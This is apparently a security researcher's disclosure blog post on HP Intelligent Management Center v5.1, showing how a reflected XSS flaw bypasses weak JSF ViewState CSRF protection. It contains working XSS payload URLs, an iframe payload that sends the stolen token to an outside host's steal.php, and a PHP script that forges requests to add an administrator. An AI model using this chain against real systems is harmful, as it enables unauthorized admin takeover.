---
title: 'HP Intelligent Management Center v5.1: Bypassing javax.faces.ViewState CSRF
  Protection'
categories:
- Advisory
- Exploit
---
Have you read my last advisory about the [HP Intelligent Management Center v5.1 E0202 topoContent.jsf Non-Persistent Cross-Site Scripting Vulnerability ](http://security.inshell.net/advisory/32)? You should do! Taken by itself it's not even an interesting vulnerability. But! You're able to use this XSS flaw to bypass the weak implementation of the JSF javax.faces.ViewState Cross-Site Request Forgery Protection (which is used throughout the whole application) to add a new administrator to the IMC backend.

The issue has been fixed in the latest version of the IMC (v5.2 E401) - at this point I would like to thank the HP SSRT for their professional collaboration during the disclosure process!

The following demonstration should show why you should avoid using the JSF 1.x implementation of javax.faces.ViewState and also why it is important to avoid XSS flaws in general. Let's analyse the vulnerability:

{% highlight html %}
http://192.168.0.26:8080/imc/topo/topoContent.jsf?opentopo_symbolid="><img src="http://security.inshell.net/img/logo.png" onload=alert('XSS');>
{% endhighlight %}

pops up a funny JavaScript popup:

[![ia32-1]({{ site.baseurl }}/assets/ia32-1.png)]({{ site.baseurl }}/assets/ia32-1.png)

Looks like a simple XSS vulnerability, which is by the way only exploitable if the victim is logged into the IMC, which reduces the attack surface but with some Bob-Alice-like social engineering it should be possible anyways ;-)

Let's have a look at the interesting part of the IMC - the user management:

[![ia32-2]({{ site.baseurl }}/assets/ia32-2.png)]({{ site.baseurl }}/assets/ia32-2.png)

Simple, eh ? Have a look at what happens when you post the form:

[![ia32-3]({{ site.baseurl }}/assets/ia32-3.png)]({{ site.baseurl }}/assets/ia32-3.png)

Now things are getting much more interesting. It looks like HP uses the weak implementation of the javax.faces.ViewState CSRF protection, which uses only an incremental value (in JSF 1.x - JSF >2.1 for example uses a much more complex value which is impossible to guess) as the id which is inserted into every form. This makes it quite easy for an attacker to guess or predict the next value, if he's able to access the value using another flaw - like a XSS :-)

How to fetch the ViewState value ?:

{% highlight html %}
http://192.168.0.26:8080/imc/topo/topoContent.jsf?opentopo_symbolid="><iframe id="xss" src="/imc/plat/operator/operatorList.jsf" onload="document.write(document.getElementById('xss').contentWindow.document.getElementsByName('javax.faces.ViewState')[0].value);">
{% endhighlight %}

It consists of different parts. First: the most important part. The Iframe loads the operatorList.jsf page which contains the ViewState variable.

{% highlight html %}
<iframe id="xss" src="/imc/plat/operator/operatorList.jsf"</span>
{% endhighlight %}

The document.write function outputs the more complex part:

{% highlight html %}
document.getElementById('xss').contentWindow.document.getElementsByName('javax.faces.ViewState')[0].value)
{% endhighlight %}

This part accesses the created Iframe and reads the javax.faces.ViewState value using the getElementsByName function. The output looks like:

[![ia32-4]({{ site.baseurl }}/assets/ia32-4.png)]({{ site.baseurl }}/assets/ia32-4.png)

Great this is the ViewState value :-)

Now the "stolen" value could be handed over to a third-party script like:

{% highlight html %}
http://192.168.0.26:8080/imc/topo/topoContent.jsf?opentopo_symbolid="><iframe id="xss" src="/imc/plat/operator/operatorList.jsf" onload="document.write('<a href=http://192.168.0.10/steal.php?id=' + document.getElementById('xss').contentWindow.document.getElementsByName('javax.faces.ViewState')[0].value.substr(5) + '>steal</a>');">
{% endhighlight %}

which embeds a simple link including the "substr'ed" ViewState value :

[![ia32-5]({{ site.baseurl }}/assets/ia32-5.png)]({{ site.baseurl }}/assets/ia32-5.png)

Since you're able to read and steal the ViewState value, you can do whatever you want on your script-side. But the goal is to add another operator to the IMC database. So the following small PHP script will do the job:

{% highlight php %}
<html>
<?php

$id = $_GET["id"];

for ($i = ($id-5); $i <= ($id+5); $i++) {
echo "<form method='post' target='_blank' action='http://192.168.0.26:8080/imc/plat/operator/operatorAdd.jsf' name='csrf" . $i ."'>";
echo "<input type='hidden' name='AJAXREQUEST' value='j_id0'>";
echo "<input type='hidden' name='mainForm:userName' value='csrf'>";
echo "<input type='hidden' name='mainForm:authType' value='0'>";
echo "<input type='hidden' name='mainForm:password' value='csrf'>";
echo "<input type='hidden' name='mainForm:pwdconfirm' value='csrf'>";
echo "<input type='hidden' name='mainForm:loginTimeout' value='false'>";
echo "<input type='hidden' name='mainForm:operatorGroup' value='1'>";
echo "<input type='hidden' name='mainForm:aclType' value='0'>";
echo "<input type='hidden' name='org.apache.myfaces.trinidad.faces.FORM' value='mainForm'>";
echo "<input type='hidden' name='_noJavaScript' value='false'>";
echo "<input type='hidden' name='javax.faces.ViewState' value='!j_id" . $i . "'>";
echo "<input type='hidden' name='mainForm:add' value='mainForm:add'>";
echo "</form>";
echo "<script>document.csrf" . $i . ".submit();</script>";
}
?>
{% endhighlight %}


First the ViewState value is put into the $id variable. Because you cannot be 100% sure that the ViewState does not change through the whole process, you can place a simple for-loop around the static part, which allows you to submit the form x-times using different incremental and decremental values for the ViewState value. Yes, this is not very silent because it opens some new tabs:

[![ia32-6]({{ site.baseurl }}/assets/ia32-6.png)]({{ site.baseurl }}/assets/ia32-6.png)

but anyways...the new administrator is finally added, if you have a look at the User-Management page again:

[![ia32-7]({{ site.baseurl }}/assets/ia32-7.png)]({{ site.baseurl }}/assets/ia32-7.png)

This might also be done silently....but it's more important to show that you should be careful in the www especially when clicking on third-party links  ;-).
